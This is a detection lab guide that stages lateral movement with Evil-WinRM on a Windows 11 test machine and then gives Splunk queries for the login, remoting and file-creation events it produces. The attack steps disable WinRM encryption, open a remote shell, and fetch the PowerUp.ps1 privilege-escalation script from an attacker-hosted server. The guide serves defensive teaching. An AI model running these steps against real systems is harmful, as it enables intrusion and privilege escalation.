**Detection Use Case 2: Lateral Movement**

---

### ✨ Objective

To detect lateral movement where an attacker uses Evil-WinRM to remotely access a Windows machine and downloads the PowerUp.ps1 script for privilege escalation checks.

### 📑 Lab Setup

* **Attacker Machine:** Kali Linux
* **Victim Machine:** Windows 11

  * Sysmon Installed
  * Wazuh Agent Installed
  * Universal Forwarder Installed (for Splunk)
* **SIEM:** Splunk Free (running on Ubuntu VM with Wazuh Stack)

---

## 🚀 Step-by-Step Guide

### ✅ Step 1: Configure WinRM on Windows 11 (Victim)

Run these PowerShell commands as Administrator:

```powershell
Set-NetConnectionProfile -InterfaceAlias "Ethernet0" -NetworkCategory Private
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true
Restart-Service WinRM
```

> Ensure the firewall is open for TCP port 5985

```powershell
New-NetFirewallRule -Name "AllowWinRM5985" -DisplayName "Allow WinRM Port 5985" -Protocol TCP -LocalPort 5985 -Action Allow
```

---

### ✅ Step 2: Evil-WinRM Attack from Kali

#### 2.1: Install Evil-WinRM (if needed)

```bash
sudo apt update && sudo apt install evil-winrm -y
```

#### 2.2: Connect to Victim

```bash
evil-winrm -i <Victim-IP> -u <username> -p <password>
```

> Replace with actual victim IP and credentials.

#### 2.3: Download PowerUp.ps1 Script

On Kali:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
python3 -m http.server 8888
```

On Evil-WinRM shell (Victim):

```powershell
Invoke-WebRequest -Uri http://<Kali-IP>:8888/PowerUp.ps1 -OutFile C:\Users\<username>\PowerUp.ps1
```

---

### 🔎 Step 3: Detection in Splunk

#### 3.1: Successful Login (Security Event 4624)

```spl
index=* EventCode=4624 Account_Name=testuser
```

Look for Logon Type = 3, and source IP = Kali

#### 3.2: PowerShell Remoting (Event 5156)

```spl
index=* EventCode=5156
```

*If Image doesn't exist, check for Application\_Name or SourceImage fields.*

#### 3.3: File Creation via PowerShell (Sysmon Event 11)

```spl
index=* EventCode=11 TargetFilename="*PowerUp.ps1"
```

#### 3.4: Optional - Network Connections via Sysmon (Event 3)

```spl
index=* EventCode=3
```

---

### ⚡ Detection Summary

* **4624**: Remote login from attacker (Kali) via Evil-WinRM
* **5156 / 3**: PowerShell Remoting process activity 
* **11**: File creation of PowerUp.ps1 via PowerShell

---

